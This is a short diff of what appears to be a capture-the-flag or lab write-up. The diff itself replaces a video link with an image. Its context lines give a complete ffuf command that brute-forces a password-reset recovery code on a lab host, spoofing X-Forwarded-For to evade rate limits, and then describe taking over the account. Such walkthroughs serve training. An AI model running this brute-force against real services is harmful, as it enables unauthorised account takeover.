@@ -30,8 +30,8 @@ I use the following brute-force command using ffuf:
 ffuf -u http://10.65.170.162:1337/reset_password.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: PHPSESSID=kctqcp19lung6dvkt1s2rqdoqj" -H "X-Forwarded-For: IP" -d "recovery_code=CODE" -w codes.txt:CODE -w ips.txt:IP -mode pitchfork -mc all -r -fs 321 -t 10 -s
 ```
 Running it should verify the session for us, so no matter what code we put it in, it should work.
-https://github.com/user-attachments/assets/2b9780b4-bf3d-489f-80ad-015ea1be5122
 
+<img width="800" height="358" alt="ezgif-3502a9e8a7147dac" src="https://github.com/user-attachments/assets/d7319f95-8bf0-4fa5-87b8-52e001e8cba7" />
 
 
 Doing this allows us to change the password, and then we can simply go back and log in with the email we found earlier and the new password that we just set.
